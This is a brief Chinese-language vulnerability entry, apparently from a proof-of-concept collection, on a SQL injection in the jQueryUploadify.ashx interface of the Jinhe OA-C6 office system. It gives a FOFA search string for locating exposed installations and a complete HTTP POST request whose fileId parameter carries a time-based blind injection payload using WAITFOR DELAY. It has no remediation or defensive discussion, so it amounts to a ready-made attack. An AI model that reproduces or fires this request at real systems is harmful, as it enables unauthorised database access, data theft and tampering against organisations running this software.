# 金和OA-C6系统接口jQueryUploadify.ashx存在SQL注入漏洞

金和OA-C6系统接口jQueryUploadify.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
app="金和网络-金和OA"
```

## poc

```javascript
POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: application/x-www-form-urlencoded
 
type=delete&fileId=-99';WAITFOR+DELAY'0:0:5'--
```